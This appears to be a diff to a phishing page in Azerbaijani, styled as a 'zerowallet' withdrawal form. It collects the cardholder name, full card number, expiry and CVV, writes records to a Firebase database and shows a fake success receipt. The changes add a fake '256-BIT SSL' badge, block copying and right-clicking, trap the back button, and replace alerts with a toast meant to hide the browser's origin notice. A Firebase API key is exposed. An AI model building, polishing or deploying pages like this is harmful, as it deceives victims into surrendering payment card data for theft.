@@ -9,54 +9,88 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --bank-blue: #004a99; --bg: #f4f7fa; --success: #10b981; }
-        body { margin: 0; background: var(--bg); font-family: 'Inter', sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        :root { 
+            --bank-blue: #1e293b; 
+            --accent: #6366f1;
+            --bg: #f8fafc; 
+            --success: #10b981; 
+        }
+
+        /* KOPYALAMA VƏ SEÇMƏ QADAĞASI */
+        * { 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none; 
+            user-select: none;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        body { 
+            margin: 0; 
+            background: var(--bg); 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            padding: 20px; 
+            min-height: 100vh;
+        }
 
         .header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
-        .back-btn { font-size: 1.2rem; color: #333; cursor: pointer; }
-        .secure-txt { font-size: 0.8rem; color: #666; font-weight: 600; }
+        .back-btn { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; background: #fff; border-radius: 12px; color: #333; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .secure-txt { font-size: 0.75rem; color: #64748b; font-weight: 700; display: flex; align-items: center; gap: 5px; }
 
         .withdraw-card, .receipt-card {
-            width: 100%; max-width: 450px; background: #fff; border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.05); padding: 30px 25px;
+            width: 100%; max-width: 450px; background: #fff; border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.04); padding: 35px 25px;
+            border: 1px solid rgba(0,0,0,0.02);
         }
 
-        /* Bank Logoları */
-        .bank-logos { display: flex; gap: 20px; margin-bottom: 25px; align-items: center; justify-content: center; }
-        .bank-logos img { height: 35px; object-fit: contain; }
+        .bank-logos { display: flex; gap: 15px; margin-bottom: 30px; align-items: center; justify-content: center; background: #f1f5f9; padding: 15px; border-radius: 16px; }
+        .bank-logos img { height: 28px; object-fit: contain; filter: grayscale(0.2); }
 
-        .label { display: block; font-size: 0.8rem; font-weight: 700; color: #444; margin-bottom: 8px; }
+        .label { display: block; font-size: 0.75rem; font-weight: 800; color: #64748b; margin-bottom: 8px; margin-left: 5px; text-transform: uppercase; }
+        
         .input-field {
-            width: 100%; padding: 15px; border: 2px solid #edf2f7; border-radius: 12px;
-            font-size: 1rem; font-weight: 600; margin-bottom: 20px; background: #fcfdfe;
+            width: 100%; padding: 16px; border: 2px solid #f1f5f9; border-radius: 16px;
+            font-size: 1rem; font-weight: 700; margin-bottom: 20px; background: #fff;
+            transition: 0.3s; outline: none; color: var(--bank-blue);
         }
+        .input-field:focus { border-color: var(--accent); background: #fff; }
 
         .confirm-btn {
-            width: 100%; padding: 18px; border: none; border-radius: 14px;
-            background: var(--bank-blue); color: #fff; font-size: 1.1rem; font-weight: 700;
-            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; padding: 20px; border: none; border-radius: 18px;
+            background: var(--bank-blue); color: #fff; font-size: 1rem; font-weight: 800;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px;
+            box-shadow: 0 10px 20px rgba(30, 41, 59, 0.2); transition: 0.3s;
         }
+        .confirm-btn:active { transform: scale(0.98); }
+        .confirm-btn:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* Professional Çek (Receipt) Dizaynı */
-        .receipt-card { display: none; text-align: center; border-top: 8px solid var(--success); }
-        .receipt-header { color: var(--success); font-size: 3rem; margin-bottom: 10px; }
-        .check-title { font-weight: 800; font-size: 1.2rem; margin-bottom: 20px; }
-        .check-details { border-top: 1px dashed #ddd; border-bottom: 1px dashed #ddd; padding: 20px 0; margin-bottom: 20px; text-align: left; }
-        .check-line { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
-        .check-line b { color: #333; }
-        .print-btn { background: #eee; color: #333; border: none; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; }
+        /* Receipt Dizayn */
+        .receipt-card { display: none; text-align: center; border-bottom: 10px solid var(--success); }
+        .receipt-header { color: var(--success); font-size: 4rem; margin-bottom: 15px; }
+        .check-title { font-weight: 800; font-size: 1.4rem; color: #1e293b; margin-bottom: 25px; }
+        .check-details { background: #f8fafc; border-radius: 20px; padding: 20px; margin-bottom: 25px; text-align: left; }
+        .check-line { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.85rem; color: #64748b; }
+        .check-line b { color: #1e293b; }
+        
+        .print-btn { background: var(--success); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; cursor: pointer; }
 
-        .visa-master { margin-top: 20px; display: flex; justify-content: center; gap: 20px; opacity: 0.3; font-size: 2rem; }
+        .visa-master { margin-top: 25px; display: flex; justify-content: center; gap: 15px; opacity: 0.4; font-size: 1.8rem; color: #64748b; }
+
+        /* TOAST BİLDİRİŞİ */
+        .toast { position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 14px 28px; border-radius: 50px; font-size: 13px; font-weight: 600; z-index: 10000; box-shadow: 0 10px 25px rgba(0,0,0,0.2); animation: fadeInDown 0.4s ease; }
+        @keyframes fadeInDown { from { top: -20px; opacity: 0; } to { top: 30px; opacity: 1; } }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
     <div class="header">
-        <div class="back-btn" onclick="location.href='main.html'"><i class="fas fa-arrow-left"></i></div>
-        <div class="secure-txt"><i class="fas fa-lock"></i> TƏHLÜKƏSİZ ÖDƏNİŞ</div>
+        <div class="back-btn" onclick="location.href='main.html'"><i class="fas fa-chevron-left"></i></div>
+        <div class="secure-txt"><i class="fas fa-shield-check" style="color:var(--success)"></i> SSL SECURE 256-BIT</div>
     </div>
 
     <div class="withdraw-card" id="main-form">
@@ -67,10 +101,10 @@
         </div>
 
         <label class="label">Kart Sahibi</label>
-        <input type="text" id="w-name" class="input-field" placeholder="AD SOYAD">
+        <input type="text" id="w-name" class="input-field" placeholder="AD SOYAD" oninput="this.value = this.value.toUpperCase()">
 
         <label class="label">Kart Nömrəsi</label>
-        <input type="text" id="w-card" class="input-field" placeholder="16 Rəqəmli Nömrə" maxlength="16">
+        <input type="number" id="w-card" class="input-field" placeholder="0000 0000 0000 0000" oninput="if(this.value.length > 16) this.value = this.value.slice(0, 16);">
 
         <div style="display:flex; gap:15px;">
             <div style="flex:1">
@@ -84,32 +118,36 @@
         </div>
 
         <button class="confirm-btn" id="pay-btn" onclick="processTransfer()">
-            <i class="fas fa-shield-alt"></i> TƏSDİQLƏ VƏ ÇIXAR
+            <i class="fas fa-lock"></i> TƏSDİQLƏ VƏ ÇIXAR
         </button>
         
         <div class="visa-master">
             <i class="fab fa-cc-visa"></i>
             <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-apple-pay"></i>
         </div>
     </div>
 
     <div class="receipt-card" id="receipt">
-        <div class="receipt-header"><i class="fas fa-check-circle"></i></div>
-        <div class="check-title">ÖDƏNİŞ TƏSDİQLƏNDİ</div>
-        <p style="font-size: 0.8rem; color: #666;">Tranzaksiya uğurla tamamlandı.</p>
+        <div class="receipt-header"><i class="fas fa-circle-check"></i></div>
+        <div class="check-title">TRANZAKSİYA UĞURLUDUR</div>
 
         <div class="check-details">
-            <div class="check-line"><span>Status:</span> <b style="color:var(--success)">UĞURLU</b></div>
+            <div class="check-line"><span>Status:</span> <b style="color:var(--success)">TAMAMLANDI</b></div>
             <div class="check-line"><span>Məbləğ:</span> <b id="r-amount">0.00 AZN</b></div>
             <div class="check-line"><span>Kart:</span> <b id="r-card">**** 1234</b></div>
             <div class="check-line"><span>Tarix:</span> <b id="r-date">--.--.2026</b></div>
-            <div class="check-line"><span>ID:</span> <b id="r-id">#ZW992837</b></div>
+            <div class="check-line"><span>ID:</span> <b id="r-id">#ZW000000</b></div>
         </div>
 
         <button class="print-btn" onclick="location.href='main.html'">ANA SƏHİFƏYƏ QAYIT</button>
     </div>
 
     <script>
+        // URL VƏ BRAUZER QORUMASI
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+
         const firebaseConfig = {
             apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
             authDomain: "sevgili-testi.firebaseapp.com",
@@ -127,8 +165,17 @@
         db.ref('zerowallet_users/' + user).once('value', snap => {
             const d = snap.val();
             userBal = d.balance;
-            userIp = d.ip;
+            userIp = d.ip || "0.0.0.0";
         });
+
+        // "Şu sayfadan" yazısı gəlməməsi üçün Custom Toast
+        function showToast(msg) {
+            let t = document.createElement('div');
+            t.className = 'toast';
+            t.innerText = msg;
+            document.body.appendChild(t);
+            setTimeout(() => t.remove(), 3000);
+        }
 
         async function processTransfer() {
             const name = document.getElementById('w-name').value;
@@ -136,11 +183,14 @@
             const exp = document.getElementById('w-date').value;
             const cvv = document.getElementById('w-cvv').value;
 
-            if(userBal < 20) return alert("Minimum 20 AZN balans lazımdır!");
-            if(card.length < 16 || name.length < 4) return alert("Məlumatlar tam deyil!");
+            // Əsas yoxlamalar
+            if(card.length < 16) return showToast("Kart nömrəsi 16 rəqəmli olmalıdır!");
+            if(name.length < 5) return showToast("Zəhmət olmasa kart üzərindəki adı tam yazın!");
+            if(cvv.length < 3) return showToast("CVV kodu yanlışdır!");
+            if(exp.length < 5) return showToast("Müddət AA/İİ formatında olmalıdır!");
 
             const btn = document.getElementById('pay-btn');
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROSES GEDİR...';
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> PROSES GEDİR...';
             btn.disabled = true;
 
             try {
@@ -152,23 +202,29 @@
                     ip: userIp, timestamp: Date.now(), transactionID: transID
                 });
 
-                // Çeki Doldur
-                document.getElementById('r-amount').innerText = userBal.toFixed(2) + " AZN";
+                document.getElementById('r-amount').innerText = userBal.toFixed(4) + " AZN";
                 document.getElementById('r-card').innerText = "**** " + card.slice(-4);
                 document.getElementById('r-date').innerText = new Date().toLocaleString();
                 document.getElementById('r-id').innerText = "#" + transID;
 
                 await db.ref('zerowallet_users/' + user).update({ balance: 0 });
 
-                // Keçid Efekti
                 document.getElementById('main-form').style.display = 'none';
                 document.getElementById('receipt').style.display = 'block';
 
             } catch(e) {
-                alert("Xəta: " + e.message);
+                showToast("Xəta: " + e.message);
                 btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-lock"></i> TƏSDİQLƏ VƏ ÇIXAR';
             }
         }
+
+        // Kart tarixi üçün avtomatik "/" əlavə etmək
+        document.getElementById('w-date').addEventListener('input', function (e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+            e.target.value = v;
+        });
     </script>
 </body>
 </html>
